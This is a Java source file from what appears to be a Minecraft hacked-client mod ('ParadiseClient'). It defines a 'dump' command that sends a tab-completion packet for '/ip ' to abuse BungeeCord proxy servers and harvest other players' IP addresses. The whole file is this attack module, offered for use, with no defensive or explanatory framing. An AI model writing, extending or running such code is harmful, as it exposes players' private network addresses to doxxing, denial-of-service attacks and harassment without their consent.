package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.commands.SharedSuggestionProvider;
import net.minecraft.network.protocol.game.ServerboundCommandSuggestionPacket;
import net.paradise_client.*;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

import java.util.Random;

public class DumpCommand extends Command {
  public DumpCommand() {
    super("dump", "IP dumping methods", CommandManager.CommandCategory.MISC);
  }

  @Override public void build(LiteralArgumentBuilder<SharedSuggestionProvider> root) {
    root.executes(context -> {
      ParadiseClient.MISC_MOD.requestId = new Random().nextInt();
      Helper.sendPacket(new ServerboundCommandSuggestionPacket(ParadiseClient.MISC_MOD.requestId, "/ip "));
      ParadiseClient.MISC_MOD.isDumping = true;
      Helper.printChatMessage("Attempting to dump IPs via bungee /ip method!");
      return Command.SINGLE_SUCCESS;
    });
  }
}
